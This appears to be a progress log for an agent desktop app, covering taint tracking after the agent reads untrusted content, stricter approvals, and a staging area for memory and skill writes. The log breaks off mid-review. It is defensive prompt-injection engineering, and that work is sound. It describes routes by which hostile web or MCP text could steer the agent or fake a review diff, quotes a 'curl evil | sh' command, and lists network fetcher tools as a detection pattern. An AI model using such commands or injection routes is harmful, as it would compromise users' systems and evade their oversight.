# Phase 6 progress

## CP6.1 — taint sources and propagation, approval effects, the Yolo warning
Worktree: C:\Users\alexandros\repos\hermes-rs-p6   Branch: backend/p6-taint   Model: Sonnet 5.5 (subagent)
Cut from `main` at 58ad175 (Phases 0-5 merged). Uncommitted.
Done:
- **New `crates/tools/src/taint.rs`**: `Taint { turn, session, sources }` (`mark`, `begin_turn`,
  `reason`, `warning`, `describe_sources`), the source constructors (`source_for_call` for web
  search/extract, `browser_*` and `vision_analyze` with an `http(s)` image; `reference_source` for
  `@url` pages; `mcp_source`, `outside_file_source`, `child_source`) and the side file
  `taint.json` (`load` / `save` / `forget`, whole-file rewrite under a process-wide lock,
  temp file + rename).
- **`SessionTools`** (`tools/src/lib.rs`) holds the taint (`TaintCell`: taint, persist flag, pending
  warnings). `taint()`, `mark_tainted(source)` (in memory, then `taint.json` through
  `spawn_blocking`), `inherit_taint` (a subagent: starts careful, never saves),
  `take_taint_warnings`, `taint_after_call(name, args, failed)` (web tools, web images,
  `read_file`/`search_files` whose path classifies `Outside`; a failed call taints nothing).
  `begin_turn` turns the turn level into the session level; `new` loads the session's entry from
  `taint.json`, so a reopened session is still careful.
- **Effects.** `check_command`: while tainted, a *flagged* command (dangerous pattern or protected
  path) is `always_ask` in Manual, AcceptEdits and Auto: once-only, never smart-approved, never
  remembered, and the question's description carries the reason ("recursive delete (this turn read
  a web page)"; the remembered key does not). Yolo: runs, and `warn_tainted` queues the line "ran
  after reading untrusted content: <sources>" (also `tracing::warn`), also with Settings'
  approvals "off". Persistence commands still ask in Yolo, now with the reason, no warning.
  `check_edit`: an `Outside` / `Persistence` write while tainted gets the reason in its question;
  Yolo writes `Outside` files and warns.
- **Wiring.** `GuardedTools` has a new field `taint: Option<Arc<SessionTools>>` (main turn and
  children: `Some`; review and curator: `None`); after every call it runs `taint_after_call` and
  emits the queued warnings. MCP: `call_mcp` in `delegate.rs` (used by `DelegatingTools` and
  `ChildToolProvider`) taints with `mcp_source(server)` unless `McpManager::server_of` says the
  server is `trusted` (new `McpServerConfig.trusted`, default false, skipped when false when
  serialised; errors taint too). `@url`: `runtime/src/lib.rs` marks after the pages are fetched.
  Subagents: `run_child` makes the child's tools inherit the parent's taint and, when the child
  finishes, marks the parent with "a subagent that read <source>" for each source the parent didn't
  have. `Runtime::taint(session_id)` exposes it; `delete_session` forgets the file entry.
- **The warning event.** New `AgentEvent::Status { kind, text }` (hermes_agent) -> the gateway
  emits `status.update {kind, text}`; the taint warning uses `kind: "fallback"` (const
  `ops::TAINT_STATUS_KIND`), the one status kind the page keeps as a system line in the
  transcript (`status.ts`, `isFallbackSwitchStatus`). Child warnings are forwarded by the subagent
  relay. ACP shows it as a thought. No patch, no new protocol shape. Documented in PITFALLS.
- Docs: PORTING (`taint.rs`, diverged), ARCHITECTURE, GAPS, PITFALLS section "Taint".
Files: crates/tools/src/{taint.rs (new),lib.rs}, crates/agent/src/events.rs,
  crates/runtime/src/{ops,delegate,mcp,lib,curator,review}.rs, crates/runtime/tests/turns.rs,
  crates/desktop/src/gateway.rs, PORTING.md, GAPS.md, docs/ARCHITECTURE.md, docs/PITFALLS.md,
  docs/backend/progress/phase-6.md
Tests (CARGO_TARGET_DIR=target/claude), all green: `cargo test -p hermes_tools -p hermes_memory -p
  hermes_store -p hermes_prompts` (tools 159 passed / 1 ignored, memory 22, store 15, prompts 12);
  `cargo test -p hermes_runtime --lib` 77; `--test turns` 126 passed / 7 ignored, under the default
  profile and under HERMES_TEST_PROFILE=balanced, requests and tokens; `cargo test -p hermes-desktop`
  170 + 68 (acp); `cargo build --workspace` OK (frozen GPUI app and desktop included; I made a
  gitignored junction `target/hermes-src` to the main checkout's, removed with `cmd /c rmdir`).
  - `taint::tests` (6): levels and reasons, dedupe/cap, every source constructor, `@url` pages,
    save/load/forget incl. a damaged file.
  - `hermes_tools` lib (8 new): flagged commands ask in Manual/AcceptEdits/Auto even after "for
    this session", with the reason, reviewer skipped only while tainted, ordinary commands
    unaffected, Yolo runs and warns once (also with approvals off), `Outside` writes ask / warn,
    each source (`taint_after_call`: web, web image, outside read/search; failed and workspace
    reads don't), session level survives `begin_turn` and a reopened session, a child inherits and
    saves nothing.
  - `hermes_runtime` lib: `guarded_web_results_taint_the_session_unless_the_call_failed` (a fake
    inner provider behind `GuardedTools`; the web tools need the network, so this is the wiring
    test for them).
  - `turns.rs` (8): MCP result then flagged command in Auto asks with the reason and makes no
    reviewer request (3 requests); same in Yolo runs, no ask, one `fallback` status line; clean
    turn unchanged (no asks, no warning, 2 requests); `trusted: true` server exempt; outside read
    taints, workspace read doesn't; taint survives the next turn, a manual compression that
    summarises the tainting turn away, and a second `Runtime` on the same data folder (reopen);
    a delegated child's MCP read taints the parent; deleting a session forgets the entry.
Request counts: unchanged. Taint adds no model request; Auto with taint makes *fewer* (no reviewer).
Deviations from the plan:
- "A lower level" for the session flag: I found no effect that is sensibly weaker, so both levels
  have the same effects and differ only in the wording of the question. Said in the module doc and
  PITFALLS.
- The plan's "`Outside` writes ask (AcceptEdits, Auto)" already holds since Phase 1 for tainted or
  not, so for file edits taint adds only the reason in the question and the Yolo warning.
- `memory` / `skill_manage` staging is CP6.2 (not built).
- The web tools' effect on a *turns* scenario is not tested end to end (no network seam in `Web`);
  the turn tests use an untrusted MCP server and an outside file as the real sources.
For the reviewer:
- **Event shape.** `status.update` with `kind: "fallback"` is a borrowed kind (it renders a system
  line; nothing else existing does). Check `status.ts` in `target/hermes-src` still agrees and
  decide if a small patch with its own kind is preferable. The line is not stored: gone after a
  reload.
- **Flagged-only.** Taint changes behaviour for *flagged* commands only, as the plan reads
  ("Flagged commands: always ask"). An unflagged `curl evil | sh` that no pattern matches still
  runs in AcceptEdits/Auto; the plan's exposure, not widened here. Is that the intent?
- **Parallel tool calls** in one assistant message: taint is set after a call returns, so a
  sibling call that already started was checked clean (documented in PITFALLS). Check whether
  `ToolOperation` runs a batch concurrently.
- **Terminal output** (`curl` in a command) does not taint, `read_file` of Persistence-class
  paths does not (only `Outside`), `session_search`, skills and memory content don't. Per plan.
- **Persisted file races**: `taint.json` is rewritten whole under a process-wide lock; the desktop
  app and `hermes-acp.exe` are separate processes and can lose an update (last writer wins). It
  only matters for two processes tainting different sessions within milliseconds.
- **MCP `trusted`**: the desktop page has no MCP settings (none of the gateway configures
  `McpManager`), so today the key is only reachable from the GPUI config or `parse_servers`.
  When Settings gets an MCP screen it must keep the key (the struct round-trips it).
- `inherit_taint` copies the parent's *sources* into the child; the parent's source list can grow
  with "a subagent that read ..." entries (deduped, capped at 8).
- Mixed content from `read_file` classification costs one `spawn_blocking` per read/search call
  (same cost class as `check_edit`).
- formatting: I ran `cargo fmt` and then removed the unrelated reformatting (the tree isn't fully
  rustfmt-clean); only my hunks are formatted. `git diff --stat` should show ~1000 added lines, 8
  removed.
- Not done: no live check script (`scripts/perf/*-check.mjs`): CP6.1 has no page-facing method;
  the warning line and the approval reason are the first things a user can see, so CP6.3's live
  check should cover them. No user checklist yet for the same reason; a manual one: with a
  session in Auto/Accept edits, ask the agent to search the web and then "delete the build
  folder": the approval card should read "recursive delete (this turn read web search results)";
  in Yolo the command runs and a line "ran after reading untrusted content: web search results"
  appears in the chat (needs a webapp build; no frontend change was made).

### Review (Opus 5.5)
Main had not moved (branch still at 58ad175); no merge. Reviewed by reading the diff, `taint.rs`,
`check_command` / `check_edit`, `GuardedTools`, `delegate.rs`, `mcp.rs`, the gateway and the page's
`status.ts`.

**Verdict:** sound; the effects are wired where the plan says and no approval path skips them.
Fixed five gaps, none large.

Checked and fine:
- Approvals: while tainted, a flagged command gets `always_ask` → `once_only`, the smart guard is
  skipped (`smart = !always_ask && ...`, so the Phase 4 approval judge too), "for this session" /
  "always" answers are not stored, a saved `always` allow-list entry or a session approval doesn't
  bypass it (the `Gate::Run` arm asks when `always_ask`). Also asks when Settings' approvals are
  "off" but the session mode is Accept edits/Auto (conservative). Subagents inherit the mode and
  the taint; their `ChildBridge` denies every ask, so a tainted child's flagged command is refused.
  ACP goes through the same `UserBridge`. Review/curator agents have no terminal (`ReviewTools`).
- Yolo: never blocks, warns once per action; persistence still asks (Phase 1), with the reason.
- The event: `status.update {kind:"fallback", text}` is read only by `isFallbackSwitchStatus`
  (`status.ts`), which appends a local system row; nothing else in the page interprets the kind.
  Not stored (gone on reload), as documented.
- Rules: store schema untouched (`taint.json` side file), file I/O through `spawn_blocking` in the
  async paths, no system-prompt text, no extra requests (clean turns unchanged, tainted Auto makes
  one fewer). PORTING row `diverged`, module docs say so.
- Parallel sibling calls (`ToolOperation` runs a batch with `join_all`): judged **not a hole** and
  left as is. Every call of a batch was written by the model before any result of that batch
  existed, so none can have been steered by a sibling's result; the next batch is checked
  tainted. PITFALLS now says this instead of listing it as uncovered.
- Rewind / `/undo` keep the taint (conservative; nothing clears it).
- Unflagged `curl evil | sh` outside Yolo still runs: that is the plan's wording ("Flagged
  commands: always ask"); widening it to every command would make a tainted session ask for
  `cargo build`. Left for the user to decide (Phase 15's sandbox is the real boundary).

Fixed:
1. **Branches started clean.** `session.branch` and `session.create` seeded with a parent's rows
   copied the untrusted messages but not the taint. New `Runtime::copy_taint(from, to)` (open
   parent: its live taint; closed: `taint.json`), called by both gateway paths; copies the whole
   taint even when the branch is cut before the tainting read. Test
   `a_branch_of_a_tainted_session_starts_tainted_and_one_of_a_clean_session_does_not`.
2. **`curl` in the terminal didn't taint.** `taint::command_source`: a command naming a fetcher
   (`curl`, `wget`, `Invoke-WebRequest`/`iwr`, `Invoke-RestMethod`/`irm`, `Net.WebClient`,
   `Start-BitsTransfer`, `lynx`, `w3m`) taints with "the output of a command that fetched from the
   network". A name check, documented as such; other terminal output still doesn't taint.
3. **Local images outside the working folder** (`vision_analyze` on a path) didn't taint while
   `read_file` of the same file did; now classified like `read_file`.
4. **MCP server looked up after the call**: a server that disconnected while answering would have
   dropped its tool list and left its answer untainted. `server_of` now runs before the call.
5. **Source names** go into the approval question and the transcript line and can carry a
   model-chosen path: now one line (control characters, newlines, ANSI escapes removed), at most
   160 characters.
Docs: PITFALLS "Taint" (fetchers, parallel calls, branches, MCP descriptions, file races), the
module doc.

Left, with reasons:
- MCP tool *descriptions* reach the model in every request and aren't a source (tainting on them
  would taint every session with a server); `session_search`, skills and memory content don't
  taint (memory/skill writes are CP6.2's staging); `python -c urllib`, `git clone` + reads inside
  the workspace aren't seen. Documented in PITFALLS.
- `taint.json`: a damaged file reads as clean and the next save drops other entries; two processes
  (desktop + ACP) can lose an update. Only affects a later reopen; documented.
- `SessionTools::new` reads `taint.json` synchronously (also for subagents' never-saved ids); it
  is called from sync `open()` that already does SQLite in line. Small; not changed.
- Hermes imports (`hermes_import.rs`) start clean.
- No live check / user checklist yet: CP6.3, as the implementer noted.
Tests after the fixes (CARGO_TARGET_DIR=target/claude), all green: tools 161 passed / 1 ignored (+2:
  fetchers, one-line names; the sources test also covers `curl` and local outside images), memory
  22, store 15, prompts 12; runtime lib 77; `--test turns` 127 passed / 7 ignored (+1, the branch
  test) under the default profile and balanced, requests, tokens; hermes-desktop 170 + 68 (acp);
  `cargo build --workspace` OK.

## CP6.2 — the staging area, `staging.*` methods, memory and skill writes staged while tainted
Worktree: C:\Users\alexandros\repos\hermes-rs-p6   Branch: backend/p6-taint   Model: Sonnet 5.5 (subagent)
CP6.1 is committed on the branch; this is uncommitted on top of it.
Done:
- **New `crates/tools/src/staging.rs`** (`hermes_tools::staging`): `StagingStore` (a handle over
  `data_dir/staging/`), `StagedItem { v, id, kind: memory|skill, op, diff, reason, session_id,
  sources, created, status: pending|stale, error }`, format version `FORMAT = 1`. `op` is a generic
  per-kind payload (`{target, operations}` for memory, `{operations, origin, bases}` for skills), so
  Phases 7/8 stage through `stage_memory_ops` / `stage_skill_ops` and a new kind adds a payload plus
  an arm in `apply`. Atomic writes (temp file + rename, one process-wide lock), damaged / newer-format
  / id-mismatch files skipped and left on disk, ids are 8-32 lowercase hex (ours: 12; no path
  traversal, no Windows device names), at most 200 files and 1 MiB each, diff cut at 20k characters.
  All blocking; callers use `spawn_blocking`.
- **Staging in the tool path.** `SessionTools::dispatch`: while `taint().is_tainted()`, `memory` and
  `skill_manage` go to `stage_memory` / `stage_skills` (spawn_blocking) instead of the stores, in every
  mode including Yolo; the result is `{success: true, staged: true, message: "Saved for review by the
  user. ..."}`. The write is checked first and a call that would fail (threat scan, missing text, bad
  name, memory full) is refused with the tool's own message and not kept. Clean sessions take the old
  path unchanged. `ReviewTools` (background review) stages too when the session is tainted (it reads
  the whole conversation, untrusted text included); the curator's tools are a clean session.
- **Memory.** `MemoryStore::parse_call` extracted from `tool_as` (the tool's whole front half, so a
  staged write is exactly the tool's write); staging dry-runs through `resolve` and pins each
  patch/remove to the entry it selects (the existing `matched_entry` mechanism); `is_stale_message`
  recognises the "Entry changed since it was staged" refusal.
- **Skills.** `SkillStore::parse_call` extracted from `manage_with`; new `plan(ops)` (simulates the
  batch against the files, later ops see earlier ones, validators and a threat scan of every text,
  returns the unified diff and `FileBase { skill, file, fingerprint }` bases) and `apply_staged(ops,
  origin, bases)` (takes the skills write lock, checks that every base file is unchanged / the skill
  still absent or present, then runs the ordinary `apply_ops_locked`: validators, whole-skill threat
  scan, git commit, index hook). Fingerprint is FNV-1a 64 (no new dependency).
- **Apply** (`StagingStore::apply`, under the lock): through `MemoryStore::apply` /
  `SkillStore::apply_staged`, so limits, threat scan and the index hooks run as for a direct write;
  the user's Apply never goes through the tools so taint doesn't re-stage it. Success removes the
  item. Failure keeps it with `error`, and `status: stale` when what it was reviewed against changed
  (pinned memory entry gone, skill file edited, skill deleted, name now taken); never half-applied.
- **Gateway.** New `crates/desktop/src/staging.rs` + thin arms in `gateway.rs`: `staging.list`
  -> `{items, count}`, `staging.apply {id}` -> `{id, kind, applied: true, message}`,
  `staging.reject {id}` -> `{id, kind, rejected: true}`; errors: missing id `-32602`, unknown id or a
  failed apply `-32000` with a sentence. REST mirror `GET /api/staging`, `POST /api/staging/<id>/apply|
  reject` (404 unknown, 409 could not apply; `{"detail": ...}`). `Runtime::staging()` and
  `Runtime::apply_staged(id)` (async, spawn_blocking). Documented as ours, outside Hermes's contract;
  the page doesn't call them yet (CP6.3).
- Items outlive their session (`delete_session` doesn't touch `staging/`) and a restart; tested.
- Docs: PORTING (two rows, diverged), ARCHITECTURE, GAPS, PITFALLS section "The staging area", module
  docs. No patch, no `hide.css` change, no new setting.
Files: crates/tools/src/{staging.rs (new),lib.rs,review.rs,skill_manage.rs},
  crates/memory/src/{lib,store,tool}.rs, crates/runtime/src/lib.rs, crates/runtime/tests/turns.rs,
  crates/desktop/src/{staging.rs (new),lib.rs,gateway.rs}, PORTING.md, GAPS.md,
  docs/ARCHITECTURE.md, docs/PITFALLS.md, docs/backend/progress/phase-6.md
Tests (CARGO_TARGET_DIR=target/claude): results at the end of this section.
  - `staging::tests` (17, hermes_tools): memory staged with memory untouched; apply writes + removes
    the item and a second apply finds nothing; reject; checked at staging (threat, missing entry);
    apply re-scans threats and limits (a hand-edited poisoned payload, a limit lowered after staging)
    and leaves the item pending with its error; a vanished memory entry -> stale; skill create staged,
    applied, index hook fires; patch stale when the file changed; skill deleted / name taken meanwhile
    -> stale, nothing written; apply re-scans skill text; staged skill checked at staging; later ops
    see earlier ones in one batch; id sanitising (`..`, separators, `con`, upper case, `.json`);
    damaged / newer-format / id-mismatch / foreign files skipped and left; count and size limits, diff
    cut; survives a restart with no temp files; no data folder cannot stage.
  - `turns.rs` (8): tainted `memory add` staged (Auto, AcceptEdits, Manual; and Yolo in its own
    test), MEMORY.md untouched, tool result "Saved for review by the user", no ask, same 3 requests,
    item has session/sources/reason/diff; clean session writes directly (2 requests, no item); tainted
    `skill_manage` create and patch staged, skills untouched, diffs shown; a threat-scan write is
    refused, not staged; Apply of a memory and a skill item writes them, removes the items, leaves the
    session tainted without staging again, and the local index finds both; limit lowered before Apply
    -> `Failed`, item pending with error, nothing written; item survives `delete_session` and a new
    `Runtime` on the same folder.
  - `hermes-desktop` (4): `staging.list` exact shape (empty and one item, no payload leaked), apply
    and reject shapes and effects, errors (missing id, unknown/hostile ids, a failed apply keeps the
    item with its error), the REST mirror's statuses.
Request counts: unchanged. Staging adds no request and, in a tainted session, the turn makes the same
  requests a direct write would have.
Deviations from the plan:
- `ReviewTools` stages for a tainted session too, though the plan's "review stages when tainted" is
  Phase 7 (CP7.2): without it a background review of a tainted conversation would write directly,
  which defeats the point. Small (two guards); Phase 7 reworks it.
- The plan's `op` field is a JSON payload per kind (not a single op string); `diff`, `reason`,
  `sources`, `created` as planned, plus `v`, `id`, `status`, `error`. `created` is milliseconds.
- `staging.list` omits the payload (`op`); the diff and a one-line `summary` are what a screen needs.
- A REST mirror was added (cheap, one prefix arm) for CP6.3's `plugin.js`.
For the reviewer:
- **Two queues.** Hermes's `memory.write_approval` / `skills.write_approval` queues (and the
  unattended review's staged memory patches/removals) are untouched (`pending/memory/`,
  `skills/.pending/`); `staging/` is separate. CP6.3's "Pending" sections need to decide whether to
  show both; folding the old ones into `staging/` was not done (out of scope, different semantics:
  they are per store and settings-driven).
- **Strict staleness for skills**: every op that reads an existing file pins its fingerprint, so a
  patch is stale when anything else in that file changed. Looser (apply when `old_string` still
  matches once) would apply to text the user didn't see. Phase 8 provenance appends `sources` to
  SKILL.md frontmatter at every review write; two staged patches to one skill make the second stale
  once the first is applied. Probably fine (re-stage), but check against Phase 8.
- `plan()` repeats the validation order of `create` / `patch` / `write_file` ... rather than
  dry-running the real writer (a dry-run would need a scratch copy of the skills tree and its git
  history). Apply re-runs the real code, so a divergence can only cause a staged item that later
  fails (visible, kept), or a refusal at staging that the real writer would have allowed. Worth a
  read for the second case (e.g. `description_budget_error`, the `delete` + `absorbed_into` rule).
- **Memory stale detection** string-matches the store's own refusal (`is_stale_message`), kept next
  to the message it matches; the alternative (a typed error from `MemoryStore::apply`) means changing
  its `Value` results.
- **Subagents** (`delegate_task` children) have no `memory` tool but do have `skill_manage`; they
  inherit the parent's taint, so their skill writes stage, with the child's own session id in the item.
- **Taint is read per call** (`taint().is_tainted()`), so a `memory` call in the same parallel batch as
  the tainting read is written directly: the batch reasoning of CP6.1 applies (the model wrote the
  call before it saw the result).
- `StagingStore::usable()` is false when the session has no data folder; a tainted write is then
  refused (fail closed). Tests that build such a session and taint it would see refusals.
- No live check script (CP6.3's, as planned; the methods are covered by gateway tests that run the
  real `Runtime`). No user checklist yet for the same reason; the manual one: with a session in any
  mode, make the agent read a web page (or an MCP result), then ask it to remember something: the
  reply says it was saved for review; `staging.list` over the socket (or `GET /api/staging`) shows
  the item; MEMORY.md unchanged until `staging.apply`.
- Formatting: new files are rustfmt-clean; the tree isn't, so I formatted only my hunks.

Test results (CARGO_TARGET_DIR=target/claude), all green: `cargo test -p hermes_tools -p hermes_memory
  -p hermes_store -p hermes_prompts` (tools 178 passed / 1 ignored (+17), memory 22, store 15,
  prompts 12); `cargo test -p hermes_runtime --lib` 77; `--test turns` 135 passed / 7 ignored (+8)
  under the default profile and under HERMES_TEST_PROFILE=balanced, requests and tokens;
  `cargo test -p hermes-desktop` 174 (+4) + 68 (acp); `cargo build --workspace` OK. The worktree's
  `target/hermes-src` junction (to the main checkout's) was missing and I recreated it (gitignored;
  remove only with `cmd /c rmdir`).

### Review (Opus 5.5)
Main had not moved (`backend/p6-taint..main` empty); no merge. Reviewed by reading the diff, both
`staging.rs`, `skill_manage.rs` (the real writer next to `plan`), `MemoryStore::batch`, the
dispatch / `ReviewTools` paths, the gateway arms and the server's origin check; attacker model:
web content the agent read steers its `memory` / `skill_manage` calls.

**Verdict:** sound design, the apply path is the real one. Fixed one correctness bug that misled
the approval diff, three ways a hostile write could make its diff lie, and the starvation case.

Checked and fine:
- **Every write is staged.** The `memory` / `skill_manage` guards sit before the ordinary arms in
  `dispatch_unredacted`, for every op (create, patch, edit, delete, write_file, remove_file, and
  malformed calls, which are refused by `parse_call`); `ReviewTools` uses the session's own
  `SessionTools` (live taint); children inherit the taint; ACP goes through the same dispatch; the
  curator is clean by design. No other caller of `manage_with` / `MemoryStore::tool` in the agent
  paths. File tools can't reach `staging/` (it is `AppData`).
- **Apply re-runs everything**: memory through `MemoryStore::apply` (threat scan of add/replace and
  of a patched entry, limits, pinned entries); skills through `apply_staged` -> `validate_ops` +
  `apply_ops_locked` (name/path/size validators, whole-skill threat scan, all-or-nothing snapshot,
  git commit, index hook) under the skills write lock after `check_bases`. The user's Apply never
  touches `SessionTools`, so taint can't re-stage it. A failure keeps the item with its error.
- (a) `plan` vs the writer: every disagreement found ends in a *visible* apply failure (plan
  looser: `create` into a non-empty folder, `delete` of an external skill, a patch of a non-UTF-8
  file) or a refusal the writer would allow (plan stricter: `write_file` of SKILL.md without
  frontmatter). Neither writes anything unreviewed: acceptable. `description_budget_error` and the
  `absorbed_into` rule match.
- (c) Strict skill staleness is right (the user approved a whole-file view). Phase 8: provenance
  appended by each review write will make a second staged patch to the same skill stale once the
  first applies; Phase 8 should re-plan a stale item (rebase) rather than loosen the check.
- (d) Staging `ReviewTools` writes for a tainted session: right call (the review reads the hostile
  text); Phase 7 owns it after.
- Ids: hex only (no Windows device name is hex), `.json` suffix, stem must equal the stored id;
  rename-over replaces a link, not its target. Concurrency: one process lock covers create, apply,
  reject (two applies -> the second is `Missing`); only the desktop gateway applies (ACP has no
  `staging.*`), so desktop+ACP can only race on the count caps. `staging.*` arms and the
  `/api/staging*` prefix don't shadow anything of Hermes's; other unknown methods/routes unchanged;
  file work in `spawn_blocking`; REST behind the server's Host/Origin check.

Fixed:
1. **`plan()` treated any skill already read as newly created.** After an op that read
   `deploy/SKILL.md`, a later `write_file` of an *existing* `deploy/references/x.md` was planned as a
   new file: the diff showed `/dev/null -> new text` (the user never saw what was overwritten) and
   the file wasn't pinned (no stale check); a later `remove_file` of an existing file was refused.
   Now only skills the batch `create`s count as empty (`Planner.created`). Files are also pinned on
   their bytes (a non-UTF-8 file no longer looks absent). Test
   `a_batch_that_reads_skill_md_still_pins_the_skills_other_files`.
2. **The diff was cut at 20k characters while the payload stayed whole**: a skill write could put
   its payload past the cut and be approved unseen. The diff is now never cut; a change whose payload
   and whole diff exceed 1 MiB is refused at staging.
3. **Hidden characters in what the user reviews.** The diff, summary, reason, sources and error now
   show control characters (ANSI escapes, a lone CR) and zero-width / bidi characters (incl. LRM/RLM,
   ALM, which the threat scan doesn't block) as `<U+XXXX>` (`staging::display_text` /
   `display_line`; stored diff and again in `staging.list`). A multi-line memory entry marks every
   line (`+ likes tea\n+ - fake removal`), so it can't fake a `- ` line; a `replace` op (Phase 7) is
   diffed as a whole-entry replacement, not a span patch. Test
   `what_the_user_reviews_shows_everything_the_write_holds`.
4. **Starvation and loops**: at most 50 items per session (one session looping on hostile content
   can't fill the 200 and crowd out the others), and the very same change staged again is kept once
   ("Saved for review by the user already ... Do not repeat it"); the cap refusals end "Do not retry."
   Test `one_session_cannot_crowd_out_the_others_and_a_repeat_is_kept_once`.
5. (b) **Typed memory staleness**: `MemoryStore::apply`'s pinned-entry refusal now carries
   `"stale": true`; `is_stale_message` (text match) is gone.
6. A staging file larger than 1 MiB is not read (`list` can't be made to load a huge planted file).
Docs: PITFALLS "The staging area" (caps, dedupe, whole diff, display escaping, the terminal gap),
PORTING row, module docs.

Left, with reasons:
- The stored diff is display only; a payload edited on disk (the terminal can write the data folder;
  commands naming it are flagged, best effort) is still fully validated at Apply but may not match
  its diff. A keyed MAC would only move the problem; the shell boundary is Phase 15.
- Cross-process apply (desktop and a future second applier) has no file claim; today only the
  desktop applies.
- (e) **Answer for CP6.3: one Pending list, not two.** Show `staging/` only, and fold the old
  `write_approval` queues (`pending/memory/`, `skills/.pending/`, and the unattended review's
  memory proposals) into it: route those settings' writes through `StagingStore` with a reason
  ("write approval is on" / "background review") and import any old records once. Two lists with
  different semantics for the same kind of thing will confuse the user; until folded, the old
  queues are not shown in the page (the GPUI app and `/memory` still read them).
Tests after the fixes (CARGO_TARGET_DIR=target/claude), all green: tools 181 passed / 1 ignored (+3),
  memory 22, store 15, prompts 12; runtime lib 77; `--test turns` 135 passed / 7 ignored under the
  default profile and balanced, requests, tokens; hermes-desktop 174 + 68 (acp); `cargo build
  --workspace` OK. Request counts unchanged.

## CP6.3 — Pending in the Memory and Skills screens, `write_approval` folded in, live check, docs
Worktree: C:\Users\alexandros\repos\hermes-rs-p6   Branch: backend/p6-taint   Model: Sonnet 5.5 (subagent)
CP6.1 and CP6.2 are committed on the branch; this is uncommitted on top of them.
Done:
- **Where the screens are.** Hermes's "memory screen" is Settings ▸ Memory & Context ▸ Persistent
  memory (`MemoryLayersSlot` in `app/settings/memory/memory-layers.tsx`, mounted by
  `config-settings.tsx`); it has no list of entries. The skills screen is Capabilities ▸ Skills
  (`SkillsTab` -> `SkillCatalog` -> `CatalogBrowser`). Hermes's plugin API has no slot in either
  (`plugin.js` registers into areas Hermes defines: statusBar, titleBar, panes, settings.plugins...;
  injecting DOM into React-owned screens is not robust), so: **three small patches**, no
  `plugin.js` / `hide.css` change.
  - `0024-staging-pending-component.patch`: new `api/staging.ts` (`hermesApi` calls of
    `GET /api/staging`, `POST /api/staging/<id>/apply|reject`) and `components/staging-pending.tsx`
    (`StagingPending kind="memory"|"skill"`).
  - `0025-memory-pending-section.patch`: `MemoryLayersSlot` renders it above the layers panel (the
    Command Center's summary is unchanged).
  - `0026-skills-pending-section.patch`: `SkillCatalog` renders it first in the `notice` fragment (under
    the filter bar; not by replacing `notice`, which would switch off the hub loader that tests `!notice`).
  - Chose REST over the gateway methods: the page's `hermesApi` is the simpler path (no socket
    handling in a component, `detail` errors become `Error.message`, assumed: see below).
- **The component.** Hidden when the kind has no items or the list call fails (older backend: nothing
  rather than a guess). Lists when the screen opens, on window focus, after every Apply / Reject. Per
  item: summary, reason, `Read: <sources>`, the whole diff in a scrollable `<pre>` (lines coloured by
  first character; React text only, no `dangerouslySetInnerHTML`; `<U+XXXX>` forms as sent; nothing
  cut), Apply / Reject. A stale item: "Out of date ..." + its error, **Reject only**. A pending item
  whose Apply failed (threat scan, limit, name taken): the server's sentence on the card
  (`role="alert"`), Apply and Reject stay. Success: a toast with the server's message; an applied
  skill invalidates the `skills-list` query.
- **Old queues: folded, for memory and skills.** Our backend does serve Hermes's `memory.write_approval`
  as a Settings switch ("Ask before the agent saves to memory", `rest.rs`) and the gateway's `/memory`
  lists `pending/memory/`, but **no page screen shows or applies those items** (Hermes's page has
  none): turning the switch on silently filled a queue the user couldn't reach. So
  `SessionTools::dispatch` now stages foreground `memory` and `skill_manage` calls into `staging/`
  when the session is tainted **or** the store's `write_approval` is on (`stages_memory` /
  `stages_skills`; reason "write approval is on" when not tainted). Not imported: items already in
  `pending/memory/` / `skills/.pending/`; not folded: the review's own writes (unattended memory
  proposals, review `skill_manage` while approval is on), which Phase 7 moves. Documented in
  PITFALLS, PORTING, patches README. This is a small step beyond the checkpoint text; it is what
  the CP6.2 review's answer (e) asked for, and without it the new Pending list would be a half-truth.
- **Live check `scripts/perf/staging-check.mjs [port] [data folder] [--dom]`**, run against my own
  instance (perf.ps1, port 47810, data in `target/perf/home`; started and stopped, unpiped; the
  user's app untouched): all checks pass (run twice): list shape (no payload, reason, sources,
  stale + error), hostile item (ESC, RLO, HTML in diff, reason and source: shown as `<U+XXXX>`, none
  raw, HTML arrives as text), `staging.list` over the socket equals REST, Apply of a memory item
  writes MEMORY.md and removes it, second Apply 404, Apply of a skill create adds it to
  `/api/skills`, a stale item and a name-taken skill are 409 with their reason and stay listed
  (stale), a hostile entry is refused again at Apply by the threat scan and stays, Reject, gone items
  404, malformed ids 404, MEMORY.md never holds the hostile text. Everything is put back. (The first
  run caught a bug in my seed, a skill description over the 60-character index limit, which Apply
  refused as it should.) The `--dom` part (section first on both screens, diff as text, Reject only
  on stale, error on a refused Apply, Reject removes the card) is written but **never run** (needs a
  built webapp).
- Docs: patches/README (0024-0026 + the old-queue note), scripts/perf/README, GAPS (CP6.3 ✅
  2026-11-12), PORTING (two rows), ARCHITECTURE, PITFALLS ("one list in the page, two queues behind
  it", the Pending section as attacker text), TESTING (junction caveat).
Files: crates/desktop/patches/{0024,0025,0026}-*.patch (new), crates/tools/src/lib.rs,
  crates/runtime/tests/turns.rs, scripts/perf/staging-check.mjs (new), scripts/perf/README.md,
  crates/desktop/patches/README.md, GAPS.md, PORTING.md, docs/ARCHITECTURE.md, docs/PITFALLS.md,
  docs/TESTING.md, docs/backend/progress/phase-6.md
Tests (CARGO_TARGET_DIR=target/claude), all green: `cargo test -p hermes_tools -p hermes_memory -p
  hermes_store -p hermes_prompts` (tools 181 passed / 1 ignored, memory 22, store 15, prompts 12);
  `hermes_runtime --lib` 77; `--test turns` 136 passed / 7 ignored (+1:
  `memory_write_approval_stages_into_the_one_list_even_in_a_clean_session`: clean session, approval on
  -> "Saved for review by the user", MEMORY.md untouched, one item with reason "write approval is
  on", old queue empty, 2 requests) under the default profile and `HERMES_TEST_PROFILE=balanced`,
  `requests`, `tokens`; `hermes-desktop` 174 + 68 (acp); `cargo build --workspace` OK. Live:
  `staging-check.mjs` passes. Request counts unchanged.
Deviations from the plan:
- Three patches (one shared component + one per screen) instead of "one small patch per screen":
  the component is a new file both screens use; each screen's patch is 7-10 changed lines.
- The `write_approval` fold above (memory and skills tool paths), not in the checkpoint line.
- "Curator merges" are not a distinct case: the curator is a clean session and writes directly today;
  when Phase 8 stages them they arrive as `kind: skill` and show in the same section.
For the reviewer:
- **Nothing in the page was seen.** The three patches pass `git apply --check` in order (0024, 0025,
  0026 on top of a scratch export with 0001-0023 applied, from `git archive` of `HERMES_COMMIT`);
